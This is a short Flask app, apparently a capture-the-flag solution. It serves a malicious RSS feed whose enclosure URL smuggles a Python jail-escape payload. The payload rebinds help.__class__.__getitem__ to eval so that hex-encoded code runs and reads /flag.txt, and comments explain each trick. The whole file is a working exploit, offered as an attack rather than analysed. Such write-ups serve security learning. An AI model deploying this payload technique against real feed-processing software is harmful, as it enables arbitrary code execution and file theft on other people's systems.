from flask import Flask

app = Flask(__name__)


@app.get("/")
def index():
    to_eval = "".join(f"\\x{ord(b):02x}" for b in "print(open('/flag.txt').read())")

    # https://shirajuki.js.org/blog/pyjail-cheatsheet/#running-functions-and-methods-without-parenthesis
    # we assign __getitem__ to the eval function on the help class (which is modifiable)
    # calling help['hello'] then triggers a call to eval('hello')
    payload = f"help.__class__.__getitem__=eval;help['{to_eval}']"

    # 1/1; is added because otherwise the [ triggers a parsing error for an ipv6 ip
    payload_url = "python://1/1;" + payload

    return f"""<?xml version="1.0" encoding="UTF-8"?>
    <rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
    <channel>
        <item>
        <title>some title</title>
        <link>some link</link>
        <description>some description</description>
        <enclosure 
            type="image/png" 
            url="{payload_url}"
        />
        </item>
    </channel>
    </rss>"""
